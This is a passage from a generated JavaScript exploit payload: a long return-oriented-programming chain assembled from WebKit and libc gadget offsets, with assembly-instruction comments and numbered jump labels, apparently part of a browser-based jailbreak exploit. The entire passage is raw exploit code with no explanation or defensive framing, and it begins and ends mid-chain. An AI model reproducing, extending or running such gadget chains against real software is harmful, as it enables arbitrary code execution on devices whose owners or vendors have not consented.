webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+206576, //L3301
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+206528, //L3298
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+206560, //L3300
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3298:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3299:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3300:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3301:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+206656, //L3302
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+206672, //L3303
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3302:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3303:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+206816, //L3307
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+206832, //L3308
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+206800, //L3306
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3305:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3306:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3307:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3308:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+206944, //L3309+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+206936, //L3309
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L3309:
db([0, 0]); // 0x0
set_gadgets([
ropchain+206960, //L3309+24
ropchain+212336, //L3304
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3310:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+772328,); //pop rcx
//L3311:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+207096, //L3314
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+207080, //L3313
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3313:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3314:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+207256, //L3317
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+207288, //L3319
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+207240, //L3316
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+207272, //L3318
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3316:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3317:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3318:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3319:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+207368, //L3320
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+207384, //L3321
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3320:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3321:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+207480, //L3323
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+207464, //L3322
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3322:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3323:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+207576, //L3325
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3324:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+772328,); //pop rcx
//L3325:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+207680, //L3328
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+207664, //L3327
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3327:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3328:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+207824, //L3332
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+207792, //L3330
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+207808, //L3331
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3330:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3331:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3332:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+207920, //L3334
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3333:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+772328,); //pop rcx
//L3334:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+208024, //L3337
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+208008, //L3336
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3336:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3337:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+208184, //L3340
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+208216, //L3342
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+208168, //L3339
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+208200, //L3341
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3339:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3340:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3341:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3342:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+208312, //L3344
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+208296, //L3343
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3343:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3344:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L3346:
ropchain+208416, //L3345
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+217976, //L3347
//L3345:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+208504, //L3349
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3348:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+772328,); //pop rcx
//L3349:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3351:
db([4294967240, 4294967295]); // -0x38
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+208648, //L3354
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+208632, //L3353
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3353:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3354:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+208808, //L3357
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+208840, //L3359
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+208792, //L3356
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+208824, //L3358
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3356:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3357:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3358:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3359:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+208920, //L3360
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+208936, //L3361
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3360:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3361:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+209032, //L3363
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+209016, //L3362
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3362:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3363:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+209144, //L3366
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L3364:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3365:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3366:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+209256, //L3367
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+209288, //L3369
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+209272, //L3368
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3367:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3368:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3369:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+15055763, //cmp rax, rcx ; sete al
webkit_base+8949069, //setle al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+209448, //L3370
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+209480, //L3372
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+209464, //L3371
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3370:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3371:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3372:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+209624, //L3376
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+209640, //L3377
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+209608, //L3375
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3374:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3375:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3376:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3377:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+209752, //L3378+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+209744, //L3378
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L3378:
db([0, 0]); // 0x0
set_gadgets([
ropchain+209768, //L3378+24
ropchain+209784, //L3373
libc_base+489696, //pop rsp
ropchain+212368, //L3379
//L3373:
libc_base+713278, //pop rsi
ropchain+209840, //L3381
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3380:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+772328,); //pop rcx
//L3381:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+209944, //L3384
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+209928, //L3383
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3383:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3384:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+210088, //L3388
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+210056, //L3386
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+210072, //L3387
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3386:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3387:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3388:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+210160, //L3389
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3389:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+210216, //L3391
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3391:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+210312, //L3394
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3393:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+772328,); //pop rcx
//L3394:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+210416, //L3397
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+210400, //L3396
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3396:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3397:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+210576, //L3400
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+210608, //L3402
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+210560, //L3399
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+210592, //L3401
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3399:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3400:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3401:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3402:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+210720, //L3403
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+210752, //L3405
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+210736, //L3404
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3403:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3404:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3405:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+210840, //L3406
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+210896, //L3408
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3408:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+210984, //L3411
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3410:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+772328,); //pop rcx
//L3411:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3413:
db([4294967244, 4294967295]); // -0x34
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+211128, //L3416
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+211112, //L3415
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3415:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3416:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+211288, //L3419
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+211320, //L3421
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+211272, //L3418
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+211304, //L3420
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3418:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3419:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3420:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3421:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+211416, //L3423
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+211400, //L3422
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3422:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3423:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+211512, //L3425
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3424:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+772328,); //pop rcx
//L3425:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+211616, //L3428
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+211600, //L3427
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3427:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3428:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+211776, //L3431
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+211808, //L3433
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+211760, //L3430
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+211792, //L3432
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3430:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3431:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3432:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3433:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+211920, //L3434
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+211952, //L3436
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+211936, //L3435
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3434:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3435:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3436:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+212096, //L3437
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+212128, //L3439
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+212112, //L3438
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3437:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3438:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3439:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+212232, //L3441
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+212248, //L3442
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3440:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+772328,); //pop rcx
//L3441:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3442:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+713278, //pop rsi
ropchain+212312, //L3445
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3445:
db([0, 0]); // 0x0
set_gadgets([
libc_base+489696, //pop rsp
ropchain+212352, //L3444
//L3304:
libc_base+489696, //pop rsp
ropchain+212368, //L3379
//L3444:
libc_base+489696, //pop rsp
ropchain+206224, //L3289
//L3379:
